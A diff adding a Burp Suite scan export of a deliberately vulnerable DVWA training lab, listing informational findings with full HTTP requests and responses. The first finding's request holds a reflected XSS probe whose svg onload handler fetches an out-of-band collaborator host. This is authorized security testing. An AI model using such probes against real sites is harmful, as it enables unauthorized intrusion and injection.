@@ -1,0 +1,3407 @@
+<?xml version="1.1"?>
+<!-- NOTE: Any NULL bytes in requests and responses are preserved within this output, even though this strictly breaks the XML syntax. If your XML parser rejects the NULL bytes then you will need to remove or replace these bytes before parsing. Alternatively, you can use the option to base64-encode requests and responses. -->
+<!DOCTYPE issues [
+<!ELEMENT issues (issue*)>
+<!ATTLIST issues burpVersion CDATA "">
+<!ATTLIST issues exportTime CDATA "">
+<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, references?, vulnerabilityClassifications?, issueDetail?, issueDetailItems?, remediationDetail?, requestresponse*, collaboratorEvent*, infiltratorEvent*, staticAnalysis*, dynamicAnalysis*)>
+<!ELEMENT serialNumber (#PCDATA)>
+<!ELEMENT type (#PCDATA)>
+<!ELEMENT name (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT location (#PCDATA)>
+<!ELEMENT severity (#PCDATA)>
+<!ELEMENT confidence (#PCDATA)>
+<!ELEMENT issueBackground (#PCDATA)>
+<!ELEMENT remediationBackground (#PCDATA)>
+<!ELEMENT references (#PCDATA)>
+<!ELEMENT vulnerabilityClassifications (#PCDATA)>
+<!ELEMENT issueDetail (#PCDATA)>
+<!ELEMENT issueDetailItems (issueDetailItem*)>
+<!ELEMENT issueDetailItem (#PCDATA)>
+<!ELEMENT remediationDetail (#PCDATA)>
+<!ELEMENT requestresponse (request?, response?, responseRedirected?)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request method CDATA "">
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT responseRedirected (#PCDATA)>
+<!ELEMENT sender (#PCDATA)>
+<!ELEMENT message (#PCDATA)>
+<!ELEMENT conversation (#PCDATA)>
+<!ELEMENT recipient (#PCDATA)>
+<!ELEMENT recipients (recipient*)>
+<!ELEMENT smtp (sender, recipients, message, conversation)>
+<!ELEMENT collaboratorEvent (interactionType, originIp, time, lookupType?, lookupHost?, requestresponse?, smtp?)>
+<!ELEMENT interactionType (#PCDATA)>
+<!ELEMENT originIp (#PCDATA)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT lookupType (#PCDATA)>
+<!ELEMENT lookupHost (#PCDATA)>
+<!ELEMENT infiltratorEvent (parameterName, platform, signature, stackTrace?, parameterValue?, collaboratorEvent)>
+<!ELEMENT parameterName (#PCDATA)>
+<!ELEMENT platform (#PCDATA)>
+<!ELEMENT signature (#PCDATA)>
+<!ELEMENT stackTrace (#PCDATA)>
+<!ELEMENT parameterValue (#PCDATA)>
+<!ELEMENT dynamicAnalysis (source, sink, sourceStackTrace, sinkStackTrace, eventListenerStackTrace, sourceValue, sinkValue, eventHandlerData, eventHandlerDataType, eventHandlerManipulatedData, poc, origin, isOriginChecked, sourceElementId, sourceElementName, eventFiredEventName, eventFiredElementId, eventFiredElementName, eventFiredOuterHtml)>
+<!ELEMENT staticAnalysis (source, sink, codeSnippets)>
+<!ELEMENT source (#PCDATA)>
+<!ELEMENT sink (#PCDATA)>
+<!ELEMENT sourceStackTrace (#PCDATA)>
+<!ELEMENT sinkStackTrace (#PCDATA)>
+<!ELEMENT eventListenerStackTrace (#PCDATA)>
+<!ELEMENT sourceValue (#PCDATA)>
+<!ELEMENT sinkValue (#PCDATA)>
+<!ELEMENT eventHandlerData (#PCDATA)>
+<!ELEMENT eventHandlerDataType (#PCDATA)>
+<!ELEMENT sourceElementId (#PCDATA)>
+<!ELEMENT sourceElementName (#PCDATA)>
+<!ELEMENT eventFiredEventName (#PCDATA)>
+<!ELEMENT eventFiredElementId (#PCDATA)>
+<!ELEMENT eventFiredElementName (#PCDATA)>
+<!ELEMENT eventFiredOuterHtml (#PCDATA)>
+<!ELEMENT eventHandlerManipulatedData (#PCDATA)>
+<!ELEMENT poc (#PCDATA)>
+<!ELEMENT origin (#PCDATA)>
+<!ELEMENT isOriginChecked (#PCDATA)>
+<!ELEMENT codeSnippets (codeSnippet*)>
+<!ELEMENT codeSnippet (#PCDATA)>
+]>
+<issues burpVersion="2.1.03" exportTime="Mon Sep 16 00:30:36 CEST 2019">
+  <issue>
+    <serialNumber>7607503816838169600</serialNumber>
+    <type>4197376</type>
+    <name><![CDATA[Input returned in response (reflected)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/login.php]]></path>
+    <location><![CDATA[/login.php [name of an arbitrarily supplied URL parameter]]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The name of an arbitrarily supplied URL parameter is copied into the application's response.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /login.php/'%22%3e%3csvg%2fonload%3dfetch%60%2f%2f57ao5kehjnnfae0lnqurdp56hxnqblzdp1joacz%5c.burpcollaborator.net%60%3e HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/
+Cookie: PHPSESSID=5ejkao0tom8grskvcecafdeio3; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Length: 429
+Content-Type: text/html; charset=iso-8859-1
+Date: Sun, 15 Sep 2019 22:25:09 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Connection: close
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /login.php/'&quot;&gt;&lt;svg/onload=fetch`//57ao5kehjnnfae0lnqurdp56hxnqblzdp1joacz\.burpcollaborator.net`&gt; was not found on this server.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com Port 80</address>
+</body></html>
+]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>6082415114356281344</serialNumber>
+    <type>5245312</type>
+    <name><![CDATA[File upload functionality]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/upload/]]></path>
+    <location><![CDATA[/vulnerabilities/upload/]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>File upload functionality is commonly associated with a number of vulnerabilities, including:</p>
+<ul>
+<li>File path traversal</li><li>Persistent cross-site scripting</li><li>Placing of other client-executable code into the domain</li><li>Transmission of viruses and other malware</li><li>Denial of service</li></ul>
+<p>You should review file upload functionality to understand its purpose, and establish whether uploaded content is ever returned to other application users, either through their normal usage of the application or by being fed a specific link by an attacker.</p>
+<p>Some factors to consider when evaluating the security impact of this functionality include:</p>
+<ul>
+<li>Whether uploaded content can subsequently be downloaded via a URL within the application.</li><li>What Content-type and Content-disposition headers the application returns when the file's content is downloaded.</li><li>Whether it is possible to place executable HTML/JavaScript into the file, which executes when the file's contents are viewed.</li><li>Whether the application performs any filtering on the file extension or MIME type of the uploaded file.</li><li>Whether it is possible to construct a hybrid file containing both executable and non-executable content, to bypass any content filters - for example, a file containing both a GIF image and a Java archive (known as a GIFAR file).</li><li>What location is used to store uploaded content, and whether it is possible to supply a crafted filename to escape from this location.</li><li>Whether archive formats such as ZIP are unpacked by the application.</li><li>How the application handles attempts to upload very large files, or decompression bomb files.</li></ul>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>File upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:</p>
+<ul>
+<li>Use a server-generated filename if storing uploaded files on disk.</li><li>Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.</li><li>Enforce a whitelist of accepted, non-executable file extensions.</li>
+<li>If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.</li>
+<li>Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server's configuration).</li><li>Reject attempts to upload archive formats such as ZIP.</li></ul>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="https://github.com/cure53/H5SC/tree/master/attachments">Various proof-of-concept files</a></li>
+<li><a href="http://labs.detectify.com/post/120088174539/building-an-xss-polyglot-through-swf-and-csp">An XSS polyglot attack</a></li>
+</ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The page contains a form which is used to submit a user-supplied file to the following URL:<ul><li>http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/upload/</li></ul>Note that Burp has not identified any specific security vulnerabilities with this functionality, and you should manually review it to determine whether any problems exist.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/upload/ HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/fi/?page=include.php
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 5099
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:23:16 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class="selected"><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: File Upload</h1>
+
+	
+
+	<div class="vulnerable_code_area">
+		<form enctype="multipart/form-data" action="#" method="POST">
+			<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
+			Choose an image to upload:<br /><br />
+			<input name="uploaded" type="file" /><br />
+			<br />
+			<input type="submit" name="Upload" value="Upload" />
+			<input type='hidden' name='user_token' value='c696a9d7a3d252e9fe517e78530ea986' />
+		</form>
+		
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload" target="_blank">https://www.owasp.org/index.php/Unrestricted_File_Upload</a></li>
+		<li><a href="https://blogs.securiteam.com/index.php/archives/1268" target="_blank">https://blogs.securiteam.com/index.php/archives/1268</a></li>
+		<li><a href="https://www.acunetix.com/websitesecurity/upload-forms-threat/" target="_blank">https://www.acunetix.com/websitesecurity/upload-forms-threat/</a></li>
+	</ul>
+</div>
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=upload&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=upload&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>5592557059707108352</serialNumber>
+    <type>5245344</type>
+    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/upload/]]></path>
+    <location><![CDATA[/vulnerabilities/upload/]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
+<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
+<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/upload/ HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/fi/?page=include.php
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 5099
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:23:16 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class="selected"><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: File Upload</h1>
+
+	
+
+	<div class="vulnerable_code_area">
+		<form enctype="multipart/form-data" action="#" method="POST">
+			<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
+			Choose an image to upload:<br /><br />
+			<input name="uploaded" type="file" /><br />
+			<br />
+			<input type="submit" name="Upload" value="Upload" />
+			<input type='hidden' name='user_token' value='c696a9d7a3d252e9fe517e78530ea986' />
+		</form>
+		
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload" target="_blank">https://www.owasp.org/index.php/Unrestricted_File_Upload</a></li>
+		<li><a href="https://blogs.securiteam.com/index.php/archives/1268" target="_blank">https://blogs.securiteam.com/index.php/archives/1268</a></li>
+		<li><a href="https://www.acunetix.com/websitesecurity/upload-forms-threat/" target="_blank">https://www.acunetix.com/websitesecurity/upload-forms-threat/</a></li>
+	</ul>
+</div>
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=upload&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=upload&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>6878454147708578816</serialNumber>
+    <type>5243904</type>
+    <name><![CDATA[Cross-domain Referer leakage]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/fi/]]></path>
+    <location><![CDATA[/vulnerabilities/fi/]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the "Referer" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>
+<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>
+<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>
+<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>
+<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.
+</p>]]></remediationBackground>
+    <references><![CDATA[<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">Referer Policy</a></li>
+</ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The page was loaded from a URL containing a query string:<ul><li>http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/fi/</li></ul>The response contains the following links to other domains:<ul><li>https://en.wikipedia.org/wiki/Remote_File_Inclusion</li><li>https://www.owasp.org/index.php/Top_10_2007-A3</li></ul>]]></issueDetail>
+    <issueDetailItems>
+      <issueDetailItem><![CDATA[https://en.wikipedia.org/wiki/Remote_File_Inclusion]]></issueDetailItem>
+      <issueDetailItem><![CDATA[https://www.owasp.org/index.php/Top_10_2007-A3]]></issueDetailItem>
+    </issueDetailItems>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/fi/?page=include.php HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_r/?name=test&user_token=8475a051467bd615a51166f2fcf38ff5
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 4681
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:23:15 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class="selected"><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
